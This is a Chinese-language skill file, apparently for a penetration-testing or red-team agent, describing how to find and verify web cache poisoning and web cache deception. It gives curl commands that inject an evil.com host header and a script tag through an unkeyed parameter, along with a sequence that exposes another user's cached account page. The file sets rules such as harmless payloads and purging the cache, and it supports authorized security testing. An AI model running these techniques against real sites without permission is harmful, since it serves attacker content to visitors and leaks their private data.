---
name: cache-poisoning
domain: cache-poison|web-cache-deception
modes: [src, redteam, pentest]
exit_artifacts: [reproduction, impact]
---

# 缓存投毒 / Web 缓存欺骗（中高 ROI）

## Domain

- 目标有 CDN / 反向代理缓存层（Cloudflare/阿里云 CDN/腾讯云 CDN/Varnish/Nginx proxy_cache/Akamai）
- 响应头有缓存痕迹：`Cache-Control` / `Age` / `X-Cache` / `X-Cache-Lookup` / `Via` / `CF-Cache-Status`
- 接口返回动态内容但带缓存头（矛盾信号 = 缓存配置错误）
- 页面反射用户输入到响应且该响应被缓存
- modes: src / pentest 适用；redteam 价值在于投毒内网缓存面

## Boundaries

- 投毒自己的请求验证 → 合规（GET 只读验证）
- 投毒后**不批量触发他人访问**验证 → 只证明"如果他人访问会拿到投毒内容"
- 不投毒恶意 JS 到公共页（可能影响其他用户 = 影响业务红线）
- 验证完立即请求清除缓存（`Cache-Control: no-cache` 或联系 CDN 清除）
- 报告末尾写 `[缓存清除]` 记录

## Pivot Hints

- Origin 不反射 → 试 `X-Forwarded-Host` / `X-Original-URL` / `X-Forwarded-Scheme` / `X-Rewrite-URL`
- 投毒不生效 → 缓存 key 可能含 cookie/method → 试不同 cookie 值分离缓存
- `X-Cache: MISS` 永远不 HIT → 加 `?` 尾部或大小写变化触发不同 cache key
- 投毒命中但危害不明 → 看投毒内容是否能改 JSON API 返回（覆盖业务数据 > 改 HTML）
- 无回显缓存 → 用时间差（投毒前后响应内容 hash 对比）

## Exit Evidence

### src
- E2: 可重放 curl（投毒请求 + 验证请求两次） + 验证请求返回投毒内容
- E3: 投毒内容含恶意 payload（XSS/重定向/数据覆盖）且缓存 HIT 证明他人会受影响
- missing_artifacts: [reproduction] 或 [impact]

### pentest
- 同 src + 评估缓存 TTL 和影响范围（多少用户/多久）

## Tactics

### 1. 识别缓存层（2-3 包）

```
# 同一 URL 请求两次，看 Age/X-Cache 变化
curl -sI https://target.com/api/data | grep -iE 'cache|age|via|x-cache'
curl -sI https://target.com/api/data | grep -iE 'cache|age|via|x-cache'
# 第二次 X-Cache: HIT / Age 增加 = 有缓存层
```

### 2. 找 unkeyed header（核心，5-8 包）

缓存 key 通常 = URL（path+query）。如果缓存层把某些 header 也算进 key，但**后端处理了这些 header**，就产生投毒：

```
# 投毒请求：带恶意 X-Forwarded-Host
curl -s -H "X-Forwarded-Host: evil.com" https://target.com/page
# 验证请求：不带该 header（模拟正常用户）
curl -s https://target.com/page
# 如果验证请求返回含 evil.com 的内容 = 投毒成功
```

逐一测试这些 header（各 1 包）：
- `X-Forwarded-Host` / `X-Host` / `X-Forwarded-Server` / `X-HTTP-Host-Override`
- `X-Original-URL` / `X-Rewrite-URL`
- `X-Forwarded-Scheme` / `X-Forwarded-Proto`
- `Referrer` / `Origin`（有些缓存把 Referer 算 key）

### 3. Web 缓存欺骗（变体，3-5 包）

不投毒 header，而是骗缓存把敏感页面当静态资源缓存：

```
# 正常请求返回用户隐私数据（Set-Cookie 鉴权）
curl -s -b "session=xxx" https://target.com/account/settings
# 加 .js/.css/.png 后缀，缓存层可能认为是静态资源直接缓存
curl -s -b "session=xxx" https://target.com/account/settings.js
# 无 session 请求该 URL → 如果返回了别人的隐私数据 = 缓存欺骗成功
curl -s https://target.com/account/settings.js
```

### 4. 参数 unkeyed（3-5 包）

缓存 key 只含部分 query 参数，后端处理了不在 key 里的参数：

```
# 投毒：utm_source 含 payload
curl -s "https://target.com/api/data?utm_source=<script>alert(1)</script>"
# 验证：不带 utm_source
curl -s "https://target.com/api/data"
# 返回含 payload = utm_source 不在 cache key 但被后端处理
```

## Common misses

- **只测 X-Forwarded-Host** → 漏 X-Original-URL/X-Rewrite-URL（Cloudflare/Akamai 各不同）
- **投毒后不验证** → MISS 不代表投毒成功，必须第二次请求确认 HIT + 内容变化
- **忽略缓存 key 分离** → 不同 cookie/method 可能走不同缓存池，投毒和验证必须在同一池
- **不区分 unkeyed input 和普通反射** → 普通反射不缓存不影响他人；unkeyed 投毒影响所有命中该缓存的用户

## Verification（verified 标准）

- **缓存投毒 verified**：投毒请求 + 验证请求两次 curl，验证请求返回投毒内容 + `X-Cache: HIT`
- **Web 缓存欺骗 verified**：带 session 请求 `敏感页.js` → 无 session 请求同 URL 返回他人隐私数据
- **phenomenon**：反射但无缓存层 / 有缓存层但无法投毒 / 投毒只影响自己

## ⚠️ 红线

- 验证投毒用无害 payload（`cache-test-xxx`），不用真实 XSS payload 投毒公共页
- 投毒验证完立即清除缓存
- 不投毒登录页/支付页（可能影响真实用户 = 影响业务红线）

## Related

- `auth-bypass.md` — X-Original-URL/X-Rewrite-URL 既是绕过也是投毒向量
- `doctrine/reflexes.md` 认证绕过 8 大头 — header 维度与此 skill 重叠
